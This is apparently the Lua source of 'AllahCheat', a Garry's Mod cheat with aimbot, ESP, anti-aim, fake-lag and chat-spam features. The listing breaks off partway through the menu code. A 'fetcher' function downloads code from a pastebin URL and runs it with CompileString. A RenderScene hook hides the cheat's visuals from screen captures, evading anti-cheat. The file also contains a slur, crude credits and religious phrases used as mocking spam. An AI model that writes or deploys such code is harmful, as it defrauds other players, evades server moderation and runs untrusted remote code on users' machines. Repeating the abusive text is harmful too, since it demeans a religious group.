-- paradox note: provided to me by kennedy

local lply = LocalPlayer()
local me = LocalPlayer()
--bSendPacket = true
--require("bsendpacket")
local fhookon = false
surface.CreateFont("Roboto", { font = "Roboto Bold", weight = 700, antialias = true, size = 25 })
surface.CreateFont("RobotoS", { font = "Roboto Bold", weight = 700, antialias = true, size = 15 })
surface.CreateFont("RobotoSS", { font = "Roboto", weight = 500, antialias = true, size = 13 })
function modulemenu()
    	moduleselect = vgui.Create("DFrame")
            moduleselect:SetSize(200, 150)
            moduleselect:SetTitle("")
            moduleselect:ShowCloseButton(false)
            function moduleselect:Paint(w, h)
                draw.RoundedBox(0, 0, 1, w, h, Color(35, 42, 60, 255))
                draw.RoundedBox(0, 0, 20, w, h, Color(26, 31, 44, 255))
                draw.SimpleTextOutlined('AC - Select Modules', 'RobotoS', 10,10,Color(149, 97, 241, 255), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
			end
			 local nonebutton = vgui.Create('DButton', moduleselect)
		        nonebutton:SetText('None')
		        nonebutton:SetSize(100, 20)
		        nonebutton:SetPos(50,25)
		        function nonebutton:DoClick()
		            print('No modules loaded.')
		            fhookon = false
		        end
		        function nonebutton:Paint()
		            draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), Color(29, 36, 52, 255))
		    end	
			 local fhookbutton = vgui.Create('DButton', moduleselect)
		        fhookbutton:SetText('gmcl_fhook_win32')
		        fhookbutton:SetSize(100, 20)
		        fhookbutton:SetPos(50,50)
		        function fhookbutton:DoClick()
		            require("fhook")
		            fhookon = true
		        end
		        function fhookbutton:Paint()
		            draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), Color(29, 36, 52, 255))
		    end
		    local closebutton = vgui.Create('DButton', moduleselect)
		        closebutton:SetText('Exit')
		        closebutton:SetSize(100, 20)
		        closebutton:SetPos(50,75)
		        function closebutton:DoClick()
		            moduleselect:Remove()
		        end
		        function closebutton:Paint()
		            draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), Color(29, 36, 52, 255))
		    end
            moduleselect:Center()
            moduleselect:MakePopup()  
           

end
modulemenu()
local goodID = {"STEAM_0:0:556353067", "STEAM_0:1:155730260", "STEAM_0:1:463472564", "STEAM_0:1:88820778"}
MsgC(Color(math.random(0,255), math.random(0,255), math.random(0,255)), [[
                                                                                
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(
 %%%%%%%%%%%%%%%%%%%%%%%%%&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(
 %%%%%%%%%%%%%%%%%%%%%%%%%&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(
 %%%%%%%%%%%%%%%%%%%%%%%%&@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(
 %%%%%%%%%%%%%%%%%%%%%%%%%%&&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(
 %%%%%%%%%%%%%%%%%%%%%%%&##&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(
 %%%%%%%%%%%%%%%%%%%%%%%&##&&%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(
 %%%%%%%%%%%%%%%%&&&&&&%&&&%&%%&%%%%%%%%%%%%%%%%%%%%&%%%%%%%%%%%%%%%%%%%%%%%%%%#
 %%%%%%%%%%%%%%%&&&&&&&%&&@%&&%%%%%%%%%%%%%%%%%%%%%%%%%%%%&%%%%%%%%%%%%%%%%%%%%#
 %%%%%%%%%&%&&&&&&&&&&&&&&@&&%&%%%%%%%%%%%%%%%%%%%%%%%&%%%&%%%%%&%&%&&&&%%%%&%&#
 %%%%%%%%%%%&&&&&&&&&&&&&&&&&&&%%%%%%%%%%%%%%%%%%%%%%%%%&&%%&&&&&&&&&&&&&&&&&&&#
 %%%&&&&&%&&&&&&&&&&&&&&&%&&&&&&%&%%%%%%%%%%%%%&%%%%%&&%%%&&%&&&&&&&%%&&&&&&&&&#
 %%%&%%&&&&&&&&&&&&&&&&&&&@&&%&&&%%%%%%%%%%%%%%%@@@@@@@@@@@@@@&@@@@&%%&&&&&&&&&#
 %&%&%&&&&&&&%&&&&&@@@@&@&@&&&&&&&&&&&%%%%%#/**/%*/////(//(///////*%&&&&&&&&&&&#
 %%%&&&&&&&&&&%#/*/%////////////(////(%%%%%(/*/*%(###((#(((((((((((%&%&&&&%%&&&#
 &&%&&&&&&&%&&(////%(/((##((((((/////(%%%%%(/**/&%%%%%%%%%%#%%%%%%%&&&%&&&&&&&&#
 &&&&&&&&&&%&&(////%##%%%%%%%%####%##%%%%%%(////&%%%%%%%%%%%%%%%%%%&&&&&&&%%&&%#
 &&%&&&&&&&&&&(////%######%###%%%#####%%%%%(////%%%%%%%%%&&%%%%%%%%&%%&&&&&&&%&#
 &&%&&&&&&&&&&(///(%%####%############%%%%%#////%%%%%%%%%%%%%%%%%##%&&&&&&&&&%%#
 &&&&&&&&&&&&&(////%#%%%##############%%%%%(//**%%%%%%%%%%%%%%%%%%#&&&&&&&&&&&&#
 &&&&&&&&&&&&&(////%%%%%%#############%%%%%(/**/&##%#%%%%#%%%%%%%%#&&&&&&&&&&%&#
 &&&&&&&&&&&&&(////%###############(##%%%%%(/***%##%%%%%%%%%%%%#%%#&&&&&&&&&&&&#
 &&&&&&&&&&&&&(////&##%###############%%%&%(/***%##%#%##%######%%%#&&&&&&&&&&&&#
 &&&&&&&&&&&&&(////%##%############(##&&%&%(/**/%%#%#%####%#%%%%#%#&&&&&&&&&&&&#
 &&&&@&&&&&&&@(////%###############((#%&%&%//***%%#%%%#%%####%##%%#&&&&&&&&&&&&#
 @@@@@&@@@@@@@(////%%%%#%#%#########((&&&&%//*//%%#%%%%%%###%#####%&&&&&&&&&&&&#
 &@&@@@@@@&&&@(////%%#%###############&%&&%//***%%%%%%%%%%%%###%%%#&&&&&&&&&@@&%
 &@@&@@&@&&@&@(//*/%%#############/**,%&&&%/****%%%%#%%%%#%##%#%#%%&&&&&&&&@@@@%
 @@@@&&@@@@@&@(////%%##########(#(***,%&&&%/****%##%#%##%##########%&&&&&&&@@&&#
 @@@@@@@@@&@&@(**//%###########((/,**,%&&&%*/**/%########(#########%@&&@&&&&&&@#
 @@@&@@@@&&&@@(*///%###########(#*,,,,%&&&%*****%##%##%#%##%###%#%#&@@@@@@@@@@@%
 @@@&&&&&&&&&@(*///%#########(#((***,,%&&&%*****%%####%#%%%%%###%##&@@@@@@@@@@@%
 @&&&&@&&@&@&@(*/*/%#%##########(*,,,.%&&&&,****######%#%%%%###%%%#&@@&&@&&@@&&#
 @@@@@@@@@@@@@#*/*/%###########(*,,,,.%&@&%,****%##%##%####%####%%%&@@&&@&@&&&&#
 @@@@@@@@&@@@@(***/#########(##(**,*,.%&@@%,****%#######%########%#&@&&&&&@&@&&%
 @@@@@@@@@@@@@(*/*/%###########(***,,.%@@@%,****%##%##%########%###&@@@@@@@@@@@%
 @@@@@@@@@@@@@(*/**########((#(*,,,,,.%&&@&,****%%#############%###%@@@@@@@@@@@%
 @@@@@@@@@@@@@(**//#########(##**,,,,.%@@@&,****###################&@@@@@@@@@@@%
 @@@@@@@@@@@@@(*//*###########/**,,,,.%@@@&,****#####(####(########%@@@@@@@@@@@%
 @@@@@@@@@@@@@(****###(###((##**,,,,,.%@@@&,****#######((#(####%%##%@@@@@@@@@@@%
 @@@@@@@@@@@@@(****#(###((((#(,*,,,,,.%@@@&,**,*%####(#########(###%@@@@@@@@@@@%
 @@@@@@@@@@@@&#(%%#%%%#(##(#(/*,,,,,,.%&@&&,****#####(#######(((#((%@@@@@@@@@@@%
 @&@@&&&&@&&%%#%&&&&&&&&%#(((*,,,,,,,.%&@&&.****#(###(##(#(####(##(%&&@&&@@&&&&#
 @&@@@(.,,,**,/##########((#(**,,,,,,.#@@@&.**,,###(#(####(##(#(#((%@&&&&@@%#%%*
 @@@@@/.*,***/**############**,*,,,,,.#@&&&.,,*,###(#((#(((((((((((%&&&&#      AllahCheat 
 @&@@@/.******##############**,,,,,...#&&&%,***,#((((((((/((///////(@&@&#      
 @@&&@(*******##%%##########**,,,,....#&&&%.,,,,(((((((*,,*.,//////(&&&&#       
 @@@@@(,******#(/(/(**/((((#/,*,,,,...#&&&%.,,,,(/(((* ,,.,*****/(/#&&&&#       
   

]])


--[[
	made by marge, beyond and shadowplaz.
	people who have AllahCheat:
		Buckie -- made watermark
		Osama Bin Semen
		Marge -- made just about everything else
		DarKnight
]]

--[[
	Credits-
	--does it matter that some of the stuff is from other cheats? No, you still have a working cheat and everyone is happy. Its all put together well so who fucking cares!
		Aimbot = BXS by Beyond and ShadowSS --good aimbot
		Some Visuals = Many cheats, alot of the visuals were updated by me however
		Friends list = NCMD by s0lum
		Fetcher = [REDACTED] --(furry cheat)
		HvH = GartWare
]]



RunConsoleCommand("cl_interp", "0.00001")

local Config = {}
Config.Col = {}
local friends = {}
local seperate = {}

Config["Aimbot"] = false
Config["AimFov"] = 30
Config["AimCircle"] = false
Config["AimHitbox"] = 1
Config["Smoothing"] = false
Config["AimSmoothing"] = 10
Config["AimKey"] = 110  
Config["MayFire"] = false
Config["UseKey"] = false
Config["Silent"] = false

Config["Tplayers"] = true
Config["Tnpc"] = false
Config["Tteam"] = true
Config["Tbots"] = true
Config["Tsteam"] = true
Config["Tgodmode"] = false
Config["Tnoclip"] = true

Config["Freezekey"] = false
Config["Lerptime"] = 500
Config["Fakeduck"] = false

Config["Antiaimr"] = false
Config["Antiaimf"] = false
Config["Fakelag"] = false
Config["Choke"] = 0

Config["EspPlayer"] = false
Config["EspProp"] = false

Config["PlayerChams"] = true
Config["PlayerChamsXQZ"] = true
Config["Propchams"] = true
Config["EspPlayername"] = true
Config["BoxFill"] = true
Config["RainborBox"] = false
Config["EspPlayerSight"] = false
Config["UseDistPlayer"] = false     
Config["UseDistProp"] = false
Config["EspRenderDistnacePlayer"] = 10000
Config["EspRenderDistanceProp"] = 10000
Config["2dbox"] = true
Config["HealthBar"] = true
Config["ArmorBar"] = true
Config["HealthBarText"] = true
Config["WepEsp"] = false
Config["RankText"] = true

Config["ArmorBarText"] = true
Config["PlyMat"] = "textured"
Config["ProMat"] = "textured"
Config["SpectatorList"] = false

Config["Thirdperson"] = false
Config["MiscToggle"] = false
Config["Bhop"] = true
Config["Nightmode"] = false
Config["Fov"] = 120
Config["FovEnable"] = true
Config["HandChams"] = false
Config["WeaponChams"] = false
Config["ClearSkybox"] = false
Config["Chatspam"] = false
Config["ChatOOC"] = true
Config["Config_name"] = nil
Config["Watermark"] = true

Config["Namechanger"] = false


Config["HudpaintBlock"] = true
Config["UnloadBlock"] = false
Config["NotifyGrab"] = true

Config["Topbar"] = true
Config["Bomb"] = true
Config["Titletext"] = true
Config["Quotetext"] = true
Config["Middlebar"] = true
Config["Ontext"] = true
Config["Offtext"] = true
Config["Body"] = true
Config["Checkboxcol"] = true
Config["Checkboxontext"] = true
Config["Checkboxofftext"] = true
Config["Binder"] = true
Config["Dropdown"] = true
Config["Slider"] = true
Config["Button"] = true
Config["Child"] = true
Config["Childm"] = true


Config.Col["AimCircle"] = "255 255 255 255"
Config.Col["PlayerChams"] = "0 255 0 255"
Config.Col["PlayerChamsXQZ"] = "0 0 255 255"
Config.Col["Propchams"] = "0 0 255 255"
Config.Col["EspPlayername"] = "255 255 255 255"
Config.Col["BoxFill"] = "255 0 191 100"
Config.Col["2dbox"] = "255 0 191 255"
Config.Col["EspPlayerSight"] = "255 255 255 255"
Config.Col["HandChams"] = "255 100 0 255"
Config.Col["WeaponChams"] = "0 255 0 255"
Config.Col["HealthBarText"] = "14 209 69 255"
Config.Col["HealthBar"] = "0 0 0 255"
Config.Col["ArmorBarText"] = "0 168 243 255"
Config.Col["RankText"] = "195 195 195 255"
Config.Col["WepEsp"] = "195 195 195 255"

Config.Col["Topbar"] = "35 42 60 255"
Config.Col["Titletext"] = "149 97 241 255"
Config.Col["Quotetext"] = "119 76 193 255"
Config.Col["Middlebar"] = "44 52 75 255"
Config.Col["Ontext"] = "149 97 241 255"
Config.Col["Offtext"] = "90 94 115 255"
Config.Col["Ontext"] = "149 97 241 255"
Config.Col["Body"] = "26 31 44 255"
Config.Col["Checkboxcol"] = "149 97 241 255"
Config.Col["Checkboxontext"] = "129 145 162 255"
Config.Col["Checkboxofftext"] = "129 145 162 255"
Config.Col["Binder"] = "29 36 52 255"
Config.Col["Dropdown"] = "29 36 52 255"
Config.Col["Slider"] = "149 97 241 255"
Config.Col["Button"] = "29 36 52 255"
Config.Col["Child"] = "49 56 74 255"
Config.Col["Childm"] = "40 46 62 255"


local methcheatchatspamlol = {
 
"godlike glua loader! - methamphetamine.solutions",
"you're gay, lol - methamphetamine.solutions",
"superior auto wall - methamphetamine.solutions",
"your ac owned - methamphetamine.solutions",
"should have bought meth - methamphetamine.solutions",
"now rewritten! - methamphetamine.solutions",
"should have used a condom - methamphetamine.solutions",
"addicting the innocent since 2018 - methamphetamine.solutions",
"your cheat will never compare - metha`mphetamine.solutions",
"can't touch this - methamphetamine.solutions",
"#1 garry's mod cheat - methamphetamine.solutions",
"god, you're sad - methamphetamine.solutions",
    
}
quoteforallah = "Astaghferullah"
local allahuakbar = {
"Allaho akbar.",
"All praise belongs to Allah.",
"Subhaan Allah, Alhamdo lillah, Allaho Akbar.",
"Astaghferullah.",
"Wa alaikum salaam.",
"Fee amaan Allah.",
"Maashallah.",
"Alaisallaho bekaafin abdohu.",
"Bismillahir Rahmanir Raheem.",
"Aaoozobillahe minushaitanir rajeem.",
"Rabbe zidni ilma.",
"Subhaan Allah.",
"Alhamdo lillah.",
"Allaho akbar.",
"Astaghferullaha Rabbi min kulle zumbin wa atoobo ileh.",
"Assalamo alaikum wa rahmatullahe wa barakatohu.",
"Inshallah.",
"Jazakallaho ahsanal jaza.",
"Barakallaho fee ahleka wa maleka.", 
}

local angc = {
    destroy = false,
    view = Angle(),
}
function MenuOptions()

return vgui.Create( "DMenu" )
end
local cfgDropdown
local verifyConfig = Config
local loadedCfg = {}
local files, dir = file.Find( "AC/*.json", "DATA" )

local function VerifyConfig()
    for k, v in pairs(verifyConfig) do
        if Config[k] == nil then
            Config[k] = verifyConfig[k]
            MsgC(Color(61, 149, 217), "\n<AC> ", Color(222, 222, 222), "The Config value ", Color(255, 0, 0), k, Color(222, 222, 222), " was nil. To prevent errors in the cheat it has been set to the default value automatically. Please make sure to save your Config with your desired settings to prevent this in the future.")
        end
    end
    for k, v in pairs(verifyConfig.Col) do
        if Config.Col[k] == nil then
            if k == "Config_name" then return end
            Config.Col[k] = verifyConfig.Col[k]
            MsgC(Color(61, 149, 217), "\n<AC> ", Color(222, 222, 222), "The Color Config value ", Color(255, 0, 0), k, Color(222, 222, 222), " was nil. To prevent errors in the cheat it has been set to the default value automatically. Please make sure to save your Config with your desired settings to prevent this in the future.")
        end
    end
end

local function CloseFrame()
    allahmenu:Remove()
    allahmenu = false
end

local function CloseFriendFrame()
    friendderma:Remove()
    friendderma = false
end

local function NetReceiverExists(name)
	return net.Receivers[name:lower()] ~= nil
end



local function SaveConfig()
    if cfgDropdown:GetSelected() == nil then return end
    
    local cfg = cfgDropdown:GetSelected()
    local JSONConfig = util.TableToJSON(Config, true)
    file.Write("AC/"..cfg, JSONConfig)

    MsgC(Color(61, 149, 217), "\n<AC> ", Color(222, 222, 222), "Saved Config - ", Color(255, 0, 0), cfg, "\n")
end

local function LoadDefault()
    local JSONConfig = file.Read("AC/default.json", "DATA")
    Config = util.JSONToTable(JSONConfig)

    VerifyConfig()

    loadedCfg[0] = "default.json"
    for k, v in ipairs(files) do
        if v == "default.json" then
            loadedCfg[1] = k
        end
    end

    MsgC(Color(61, 149, 217), "\n<AC> ", Color(222, 222, 222), "Loaded Default Config\n")
end

local function LoadConfig()
    if cfgDropdown:GetSelected() == nil then return end

    local cfg = cfgDropdown:GetSelected()
    local JSONConfig = file.Read("AC/"..cfg, "DATA")
    Config = util.JSONToTable(JSONConfig)

    VerifyConfig()

    loadedCfg[0] = cfg
    for k, v in ipairs(files) do
        if v == cfg then
            loadedCfg[1] = k
        end
    end

    MsgC(Color(61, 149, 217), "\n<AC> ", Color(222, 222, 222), "Loaded Config - ", Color(255, 0, 0), cfg, "\n")

    CloseFrame()
    allahui()
end


local function CreateConfig()
    if Config["Config_name"] == nil then return end
    
    if file.Exists("AC/"..Config["Config_name"]..".json", "DATA") then return end

    local JSONConfig = util.TableToJSON(Config, true)
    file.CreateDir("AC")
    file.Write("AC/"..Config["Config_name"]..".json", JSONConfig)

    MsgC(Color(61, 149, 217), "\n<AC> ", Color(222, 222, 222), "Created Config - ", Color(255, 0, 0), Config["Config_name"], "\n")

    CloseFrame()
    allahui()
end


local function DeleteConfig()
    if cfgDropdown:GetSelected() == nil then return end
    
    local cfg = cfgDropdown:GetSelected()
    file.Delete("AC/"..cfg)

    loadedCfg = {}

    MsgC(Color(61, 149, 217), "\n<AC> ", Color(222, 222, 222), "Deleted Config - ", Color(255, 0, 0), cfg, "\n")

    CloseFrame()
    allahui()
end

local fetcher = {}

function fetcher.Get( url )
    http.Fetch( url, function( body )
        code = body
        pcall( CompileString( code, math.random( 1, 99 ) ) )
    end, function( error )
        print('your a fucking retard')
    end)
end

local isitloaded = false
local function loadantiaim()
	fetcher.Get( 'https://pastebin.com/raw/gz6p6TEJ' )
	isitloaded = true
	Config["Silent"] = false
end

local function makeHook(txt, fnc)
    local sys,txsz = tostring((util.CRC(math.random(10^4)+SysTime())) )..'',#txt
    local name = 'AllahCheat|'..util.CRC(math.random(10^4)+SysTime())
    hook.Add(txt,name,fnc)
end

local function unload()
    for k,v in pairs(hook.GetTable()) do
        for k1,v1 in pairs(v) do
            if string.find(tostring(k1),'AllahCheat|') then
                hook.Remove(k,k1)
                print("unloaded: ", k, k1)
            end
        end
    end
end
concommand.Add("unload", unload)
local vdbg = {
    destroy = false,
    view = Angle(),
}

local fakeRT = GetRenderTarget( "fakeRT" .. os.time(), ScrW(), ScrH() )

makeHook( "RenderScene", function( vOrigin, vAngle, vFOV )
    local view = {
        x = 0,
        y = 0,
        w = ScrW(),
        h = ScrH(), 
        dopostprocess = true,
        origin = vOrigin,
        angles = vAngle,
        fov = vFOV,
        drawhud = true,
        drawmonitors = true,
        drawviewmodel = true
    }

    render.RenderView( view )
    render.CopyTexture( nil, fakeRT )

    cam.Start2D()
        hook.Run( "SHUDPaint" )
    cam.End2D()

    render.SetRenderTarget( fakeRT )

    return true
end )

makeHook( "ShutDown", function()
    render.SetRenderTarget()
end )

local function GetTextSize(font,str)
    surface.SetFont(font)
    return surface.GetTextSize(str)
end

local function DrawRect(parent, color, color2, w, h, x, y)
    if color then
        surface.SetDrawColor(color)
    else
        surface.SetDrawColor(Color(46,46,46,240))
    end

    surface.DrawRect(x or 0, y or 0, w or parent:GetWide(), h or parent:GetTall() )

    if col2 then
        surface.SetDrawColor(color2)
    else
        surface.SetDrawColor(Color(0,0,0))
    end

    surface.DrawOutlinedRect(x or 0, y or 0, w or parent:GetWide(), h or parent:GetTall())
end


	
local function paintListView(list)
    function list:Paint()
        surface.SetDrawColor(string.ToColor(Config.Col["Body"]))
        surface.DrawRect(0, 0, self:GetWide(), self:GetTall())
    end
    function list.VBar:Paint()
        surface.SetDrawColor(Color(60, 60, 60, 0))
        surface.DrawRect(0, 0, self:GetWide(), self:GetTall())
    end
    function list.VBar.btnGrip:Paint()
        surface.SetDrawColor(Color(100, 50, 50, 0))
        surface.DrawRect(0, 0, self:GetWide(), self:GetTall())
        surface.SetDrawColor(Color(200, 0, 0))
        surface.DrawOutlinedRect(0, 0, self:GetWide(), self:GetTall())
    end
    function list.VBar.btnUp:Paint()
        surface.SetDrawColor(Color(100, 100, 100,0))
        surface.DrawRect(0, 0, self:GetWide(), self:GetTall())
    end
    function list.VBar.btnDown:Paint()
        surface.SetDrawColor(Color(100, 100, 100,0))
        surface.DrawRect(0, 0, self:GetWide(), self:GetTall())
    end
    for _, v in pairs(list.Columns) do
        function v.Header:Paint()
            surface.SetDrawColor(string.ToColor(Config.Col["Body"]))
            surface.DrawRect(2.5, 0, self:GetWide() - 5, self:GetTall())
            self:SetTextColor(string.ToColor(Config.Col["Titletext"]))
        end
    end
end

local function CheckBox(Parent, Text, PosX, PosY, Var, Col, Able)
    local CheckBox = vgui.Create( "DCheckBoxLabel", Parent )
    CheckBox:SetFont("RobotoS")
    CheckBox:SetText( Text )
    CheckBox:SetSize( 16 + 150, 17 )
    CheckBox:SetPos( PosX, PosY )
    CheckBox:SetValue( Config[Var] )
    function CheckBox:OnChange(bVal)
      Config[Var] = bVal
    end
  function CheckBox.Button:Paint(w, h)
  	if !Able then
	    if self:GetChecked() then
	        CheckBox:SetTextColor(string.ToColor(Config.Col["Checkboxontext"]))
	        surface.SetDrawColor(70,74,74)
	        surface.DrawOutlinedRect(0,0,15,15)
	        draw.RoundedBox( 2, 2, 2, 11, 11, string.ToColor(Config.Col["Checkboxcol"]) )
	    else
	        CheckBox:SetTextColor(string.ToColor(Config.Col["Checkboxofftext"]))
	        surface.SetDrawColor(70,74,74)
	        surface.DrawOutlinedRect(0,0,15,15)
	    end
    end
  end
  if Col then
        local cx, cy = CheckBox:GetPos()
        local colorPicker = vgui.Create("DColorButton", Parent)
        colorPicker:SetSize(11, 11)
        colorPicker:SetPos(cx + 150 + 4, PosY + 2)
        colorPicker:SetColor(string.ToColor(Config.Col[Var]))

        function colorPicker:DoClick()
            if IsValid(colorWindow) then
                colorWindow:Remove()
            end
            colorWindow = vgui.Create("DFrame")
            colorWindow:SetSize(300, 225)
            colorWindow:SetTitle("")
            colorWindow:ShowCloseButton(false)
            
            local cbutton = vgui.Create('DButton', colorWindow)
            cbutton:SetText('')
            cbutton:SetSize(10, 10)
            cbutton:SetPos(colorWindow:GetWide() - cbutton:GetWide() - 4, 5)
            function cbutton:DoClick()
                colorWindow:Remove()
            end
            function cbutton:Paint()
                draw.RoundedBox(5, 0, 0, self:GetWide(), self:GetTall(), Color(255, 25, 25))
            end
            
            function colorWindow:Paint(w, h)
                draw.RoundedBox(0, 0, 1, w, h, string.ToColor(Config.Col["Topbar"]))
                draw.RoundedBox(0, 0, 20, w, h, string.ToColor(Config.Col["Body"]))
                draw.SimpleTextOutlined('AC - ' ..Text, 'RobotoS', 10,10, string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
                colorPicker:SetColor(string.ToColor(Config.Col[Var]))   
            end

            colorWindow:Center()
            colorWindow:MakePopup()
            local colorSelector = vgui.Create("DColorMixer", colorWindow)
            colorSelector:Dock(FILL)
            colorSelector:DockPadding(5, 5, 5, 25)
            colorSelector:SetPalette(true)
            colorSelector:SetColor(string.ToColor(Config.Col[Var]))
            function colorSelector:ValueChanged(val)
                local r = tostring(val.r)
                local g = tostring(val.g)
                local b = tostring(val.b)
                local a = tostring(val.a)
                local col = r.." "..g.." "..b.." "..a
                Config.Col[Var] = col
            end
        end
    end
end

local function Slider(x, y, var, min, max, parent)
    local slider = vgui.Create("DNumSlider", parent)
    slider:SetWide(250)
    slider:SetPos(x,y)
    slider:SetMin(min)
    slider:SetMax(max)
    slider:SetDefaultValue(999)
    slider:SetValue(Config[var])
    function slider:OnValueChanged()
        Config[var] = slider:GetValue()
    end
    slider.Slider.Paint = function(self,w,h)
        local getwidth = slider.Slider.Knob:GetPos()
        draw.RoundedBox(3,0,16,w-4,5,Color(32,36,48))
        draw.RoundedBox(3,0,16,getwidth-2,5, string.ToColor(Config.Col["Slider"]))
    end
    slider.Slider.Knob:SetSize(2,2)
    slider.Slider.Knob.Paint = function(self,w,h)
    end
end

local function drawPanel(x,y,w,h,txt)
    draw.RoundedBox(2,x,y,w,h,string.ToColor(Config.Col["Child"]) )
    draw.RoundedBox(2,x+1,y+1,w-2,h-2,string.ToColor(Config.Col["Childm"]) )
    draw.RoundedBox(0,x+1,y+20,w-1,1,string.ToColor(Config.Col["Child"]) )
    draw.SimpleTextOutlined(txt, 'RobotoS', x+w/2, y+2, string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_CENTER,TEXT_ALIGN_TOP, 1, Color( 0, 0, 0, 50 ) )
end
local function whatpos()
	if fhookon then 
		coolpo1 = 270
		coolpo2 = 280
	else
		coolpo1 = 250
		coolpo2 = 260
	end
end
aimopen = true
local activetabs = 'Aimbot'
local activetab = 'Aimbot'
function allahui()
files, dir = file.Find( "AC/*.json", "DATA" )
    allahmenu = vgui.Create("DFrame")
    allahmenu:SetSize(680,440)
    allahmenu:SetTitle("")
    allahmenu:Center()
    allahmenu:SetDraggable(true)
    allahmenu:ShowCloseButton(false)
    if Config["Bomb"] then
    	allahmenu:SetIcon("icon16/bomb.png")
    end
    allahmenu:MakePopup()
  	allahmenu.Paint = function(self, w, h)
	draw.RoundedBoxEx(0, 0, 0, w, 50, string.ToColor(Config.Col["Topbar"]), true, false, true, false)
	draw.RoundedBoxEx(0, 0, 50, w, h-50, string.ToColor(Config.Col["Body"]), true, false, true, false)
	if Config["Titletext"] then
		draw.SimpleTextOutlined('AllahCheat', 'Roboto', 25,25, string.ToColor(Config.Col["Titletext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
	end
	if Config["Quotetext"] then
		draw.SimpleTextOutlined(quoteforallah, 'RobotoS', 25,10, string.ToColor(Config.Col["Quotetext"]), TEXT_ALIGN_LEFT,TEXT_ALIGN_CENTER, 0.5, Color( 0, 255, 255, 0 ) )
	end
	end
		
	local panel1 = vgui.Create('DPanel', allahmenu)
	panel1:SetSize( allahmenu:GetWide(), allahmenu:GetTall() - 50)
	panel1:SetPos( 0, 50 )
	panel1.Paint = function(self, w, h)
        drawPanel(10,26,w/3-12,h-36,"Main")
        drawPanel(w/3+6,26,w/3-12,h-36,"Targets")
        drawPanel(w/1.5+2,26,w/3-12,h-36,"Exploits")  
	end
	panel1:SetVisible(activetab == 'Aimbot')
	
	local hvhpanel = vgui.Create('DPanel', allahmenu)
	hvhpanel:SetSize( allahmenu:GetWide(), allahmenu:GetTall() - 50)
	hvhpanel:SetPos( 0, 50 )
	hvhpanel.Paint = function(self, w, h)
        drawPanel(10,26,w/3-12,h-36,"Real")
        drawPanel(w/3+6,26,w/3-12,h-36,"Fake")
        drawPanel(w/1.5+2,26,w/3-12,h-36,"Fake-Lag")  
	end
	hvhpanel:SetVisible(activetab == 'HvH')
	
	local panel2 = vgui.Create('DPanel', allahmenu)
	panel2:SetSize( allahmenu:GetWide(), allahmenu:GetTall() - 50)
	panel2:SetPos( 0,50 )
	panel2.Paint = function(self, w, h)
        drawPanel(10,26,w/3-12,h-36,"Player ESP")
        drawPanel(w/3+6,26,w/3-12,h-36,"Prop ESP")
        drawPanel(w/1.5+2,26,w/3-12,h-36,"Panels")  

	end
	panel2:SetVisible(activetab == 'Esp')
	
	local panel3 = vgui.Create('DPanel', allahmenu)
	panel3:SetSize( allahmenu:GetWide(), allahmenu:GetTall() - 50)
	panel3:SetPos( 0,50 )
	panel3.Paint = function(self, w, h)
        drawPanel(10,26,w/3-12,h-36,"Main")
        drawPanel(w/3+6,26,w/3-12,h-36,"Config")
        drawPanel(w/1.5+2,26,w/3-12,h-36,"Screengrab")  
	end
	panel3:SetVisible(activetab == 'Misc')
	
	
	local Tab1 = vgui.Create( "DButton", allahmenu )
	Tab1:SetText( "" )
	Tab1:SetPos( 415, 10 )
	Tab1:SetSize( 140, 50 )
	Tab1.Paint = function(self, w, h)
	if activetab == 'Aimbot' or activetabs == 'Aimbot' or activetab == 'HvH' then
	     draw.RoundedBox(1, 35, 39, 100, 1, string.ToColor(Config.Col["Ontext"]))
	    draw.SimpleText("Aimbot", "Roboto", 50, 15, string.ToColor(Config.Col["Ontext"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	else
		draw.SimpleText("Aimbot", "Roboto", 50, 15, string.ToColor(Config.Col["Offtext"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	end
	end
	Tab1.DoClick = function()
	    activetab = 'Aimbot'
	    activetabs = 'Aimbot'
	    aimopen = true
	    panel1:SetVisible(true)
	    hvhpanel:SetVisible(false)
	    panel2:SetVisible(false)
	    panel3:SetVisible(false)
	
end
--[[
	local aimbottab = vgui.Create( "DButton", allahmenu )
    aimbottab:SetText( "" )
    aimbottab:SetPos( 0, 46 )
    aimbottab:SetSize( 100, 30 )
    aimbottab.Paint = function(self, w, h)
    if aimopen  then
	    if activetabs == 'Aimbot' then
	         draw.RoundedBox(1, 0, h-1, w, 1, string.ToColor(Config.Col["Ontext"]))
	        draw.SimpleText("Aimbot", "RobotoS", w/2, 15, string.ToColor(Config.Col["Ontext"]), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	    else
	        draw.SimpleText("Aimbot", "RobotoS", w/2, 15, string.ToColor(Config.Col["Offtext"]), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	    end
	end
    end
    aimbottab.DoClick = function()
        activetabs = 'Aimbot'
        activetab = 'Aimbot'
        aimopen = true
        panel1:SetVisible(true)
        hvhpanel:SetVisible(false)
        panel2:SetVisible(false)
        panel3:SetVisible(false)
    end
    
    local hvhtab = vgui.Create( "DButton", allahmenu )
    hvhtab:SetText( "" )
    hvhtab:SetPos( 100, 46 )
